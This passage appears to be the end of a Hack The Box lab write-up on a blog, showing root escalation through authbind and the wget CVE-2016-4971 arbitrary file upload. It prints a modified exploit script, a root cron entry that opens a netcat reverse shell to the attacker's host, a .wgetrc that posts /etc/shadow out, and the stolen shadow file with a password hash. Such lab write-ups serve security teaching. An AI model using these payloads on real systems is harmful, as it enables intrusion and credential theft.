</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/runpy.py&#34;</span>, line 72, in _run_code
</span></span><span style="display:flex;"><span>    exec code in run_globals
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/SimpleHTTPServer.py&#34;</span>, line 235, in &lt;module&gt;
</span></span><span style="display:flex;"><span>    test<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/SimpleHTTPServer.py&#34;</span>, line 231, in test
</span></span><span style="display:flex;"><span>    BaseHTTPServer.test<span style="color:#f92672">(</span>HandlerClass, ServerClass<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/BaseHTTPServer.py&#34;</span>, line 606, in test
</span></span><span style="display:flex;"><span>    httpd <span style="color:#f92672">=</span> ServerClass<span style="color:#f92672">(</span>server_address, HandlerClass<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/SocketServer.py&#34;</span>, line 417, in __init__
</span></span><span style="display:flex;"><span>    self.server_bind<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/BaseHTTPServer.py&#34;</span>, line 108, in server_bind
</span></span><span style="display:flex;"><span>    SocketServer.TCPServer.server_bind<span style="color:#f92672">(</span>self<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/SocketServer.py&#34;</span>, line 431, in server_bind
</span></span><span style="display:flex;"><span>    self.socket.bind<span style="color:#f92672">(</span>self.server_address<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/socket.py&#34;</span>, line 228, in meth
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> getattr<span style="color:#f92672">(</span>self._sock,name<span style="color:#f92672">)(</span>*args<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>socket.error: <span style="color:#f92672">[</span>Errno 13<span style="color:#f92672">]</span> Permission denied
</span></span></code></pre></div><p>Or do we?</p>
<p>After some enumeration we find out that <strong>authbind</strong> is running in the host, which enable rules that will let us access this port:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ ls -l /etc/authbind/byport
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root atanas <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2017</span> <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root atanas <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2017</span> <span style="color:#ae81ff">80</span>
</span></span></code></pre></div><p>Members of group <strong>atanas</strong> have acces to ports 80 and 21 through authbind, and we are part of that group so let&rsquo;s check if we can have control over this port with a netcat:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ authbind nc -lvnp <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>Listening on <span style="color:#f92672">[</span>0.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family 0, port 80<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Connection from <span style="color:#f92672">[</span>10.0.3.133<span style="color:#f92672">]</span> port <span style="color:#ae81ff">80</span> <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> accepted <span style="color:#f92672">(</span>family 2, sport 45116<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>GET /archive.tar.gz HTTP/1.1
</span></span><span style="display:flex;"><span>User-Agent: Wget/1.16 <span style="color:#f92672">(</span>linux-gnu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Accept: */*
</span></span><span style="display:flex;"><span>Host: 10.0.3.1
</span></span><span style="display:flex;"><span>Connection: Keep-Alive
</span></span></code></pre></div><p>After some time we get the connection we saw previously on the log. And since we are using netcat we can see more information about the request.</p>
<p>The request is being done with <strong>Wget</strong> version <strong>1.16</strong>, which is different to the one I have so maybe there&rsquo;s some vulnerabilities to it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ wget --version
</span></span><span style="display:flex;"><span>GNU Wget 1.21.3 built on linux-gnu.
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ searchsploit wget 1.16
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span> Exploit Title                                                                                                 |  Path
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span>GNU Wget &lt; 1.18 - Access List Bypass / Race Condition                                                          | multiple/remote/40824.py
</span></span><span style="display:flex;"><span>GNU Wget &lt; 1.18 - Arbitrary File Upload <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                    | linux/remote/49815.py
</span></span><span style="display:flex;"><span>GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution                                                | linux/remote/40064.txt
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>There&rsquo;s an RCE available. This vulnerability will let us truncate the file that&rsquo;s being requested and make it download another file, and not only that, we can even control where this file is going to be downloaded to.</p>
<p>We will be using an FTP service and a HTTP service, luckily for us we have access to both of them with authbind.</p>
<p>The process is well explained in the searchsploit file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ authbind python -m SimpleHTTPServer <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ mkdir /tmp/ftptest
</span></span><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ cd !$
</span></span><span style="display:flex;"><span>cd /tmp/ftptest
</span></span><span style="display:flex;"><span>atanas@kotarak-dmz:/tmp/ftptest$ cat <span style="color:#e6db74">&lt;&lt;_EOF_&gt;.wgetrc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt; post_file = /etc/shadow
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt; output_document = /etc/cron.d/wget-root-shell
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt; _EOF_</span>
</span></span><span style="display:flex;"><span>atanas@kotarak-dmz:/tmp/ftptest$ ls -a
</span></span><span style="display:flex;"><span>.  ..  .wgetrc
</span></span></code></pre></div><p>We have created a directory inside tmp and a file <strong>.wgetrc</strong>.</p>
<p>Next up, copy the <strong>wget-exploit.py</strong> specified inside the exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>---<span style="color:#f92672">[</span> wget-exploit.py <span style="color:#f92672">]</span>---
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Wget 1.18 &lt; Arbitrary File Upload Exploit</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dawid Golunski</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># dawid( at )legalhackers.com</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE-2016-4971</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import SimpleHTTPServer
</span></span><span style="display:flex;"><span>import SocketServer
</span></span><span style="display:flex;"><span>import socket;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>I will make some changes so the cronjob that will be injected in the container so it sends a reverse shell to me:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>HTTP_LISTEN_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0.0.0.0&#39;</span>
</span></span><span style="display:flex;"><span>HTTP_LISTEN_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>FTP_HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.10.55&#39;</span>
</span></span><span style="display:flex;"><span>FTP_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ROOT_CRON <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.161 334 &gt;/tmp/f</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>handler <span style="color:#f92672">=</span> SocketServer<span style="color:#f92672">.</span>TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;Ready? Is your FTP server running?&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>connect_ex((FTP_HOST, FTP_PORT))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> result <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;FTP found open on </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">. Let&#39;s go then</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (FTP_HOST, FTP_PORT)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;FTP is down :( Exiting.&#34;</span>
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;Serving wget exploit on port </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">...</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> HTTP_LISTEN_PORT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>handler<span style="color:#f92672">.</span>serve_forever()
</span></span></code></pre></div><p>Having this set let&rsquo;s launch tmux and run both the FTP server and the exploit at the same time:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>atanas@kotarak-dmz:/tmp/ftptest$ authbind python wget-exploit.py
</span></span><span style="display:flex;"><span>Ready? Is your FTP server running?
</span></span><span style="display:flex;"><span>FTP found open on 10.129.1.117:21. Let<span style="color:#960050;background-color:#1e0010">&#39;</span>s go <span style="color:#66d9ef">then</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>atanas@kotarak-dmz:/tmp/ftptest$ authbind python -m pyftpdlib -p21 -w
</span></span><span style="display:flex;"><span>/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
</span></span><span style="display:flex;"><span>  RuntimeWarning<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I 2022-07-13 14:40:05<span style="color:#f92672">]</span> &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid<span style="color:#f92672">=</span><span style="color:#ae81ff">40763</span> <span style="color:#f92672">&lt;&lt;&lt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I 2022-07-13 14:40:05<span style="color:#f92672">]</span> concurrency model: async
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I 2022-07-13 14:40:05<span style="color:#f92672">]</span> masquerade <span style="color:#f92672">(</span>NAT<span style="color:#f92672">)</span> address: None
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I 2022-07-13 14:40:05<span style="color:#f92672">]</span> passive ports: None
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I 2022-07-13 14:40:53<span style="color:#f92672">]</span> 10.129.1.117:51160-<span style="color:#f92672">[]</span> FTP session opened <span style="color:#f92672">(</span>connect<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Eventually we get the first request:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Serving wget exploit on port 80...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>We have a volunteer requesting /archive.tar.gz by GET :<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Uploading .wgetrc via ftp redirect vuln. It should land in /root
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>10.0.3.133 - - <span style="color:#f92672">[</span>13/Jul/2022 14:38:01<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">301</span> -
</span></span><span style="display:flex;"><span>Sending redirect to ftp://anonymous@10.129.1.117:21/.wgetrc
</span></span></code></pre></div><p>If everything goes as right in the next one we should get the <strong>/etc/shadow</strong> and the cronjob should be installed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>We have a volunteer requesting /archive.tar.gz by POST :<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Received POST from wget, this should be the extracted /etc/shadow file:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---<span style="color:#f92672">[</span>begin<span style="color:#f92672">]</span>---
</span></span><span style="display:flex;"><span> root:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>daemon:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>bin:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>sys:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>sync:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>games:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>man:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>lp:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>mail:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>news:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>uucp:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>proxy:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>www-data:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>backup:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>list:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>irc:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>gnats:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>nobody:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-timesync:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-network:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-resolve:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-bus-proxy:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>syslog:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>_apt:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>sshd:*:17366:0:99999:7:::
</span></span><span style="display:flex;"><span>ubuntu:$6$edpgQgfs$CcJqGkt.zKOsMx1LCTCvqXyHCzvyCy1nsEg9pq1.dCUizK/98r4bNtLueQr4ivipOiNlcpX26EqBTVD2o8w4h0:17368:0:99999:7:::
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---<span style="color:#f92672">[</span>eof<span style="color:#f92672">]</span>---
</span></span></code></pre></div><p>And after a minute we get the connection:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.1.117.
</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.1.117:60702.
</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span><span style="color:#75715e"># hostname -I</span>
</span></span><span style="display:flex;"><span>10.0.3.133
</span></span></code></pre></div><p>Perfect! We got access to the container, now we can see the root flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-tex" data-lang="tex"><span style="display:flex;"><span># cat /root/root.txt
</span></span><span style="display:flex;"><span>950d1425795dfd******************
</span></span></code></pre></div><p>See you next time!</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="https://theloganlab.github.io/posts/resolute/">
                <span class="button__icon">←</span>
                <span class="button__text">HTB: Resolute</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="https://theloganlab.github.io/posts/celest/">
                <span class="button__text">HTB: Celestial</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  
  

  
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
      </div>
  </div>
</footer>

<script src="https://theloganlab.github.io/assets/main.js"></script>
<script src="https://theloganlab.github.io/assets/prism.js"></script>







  
</div>

</body>
</html>
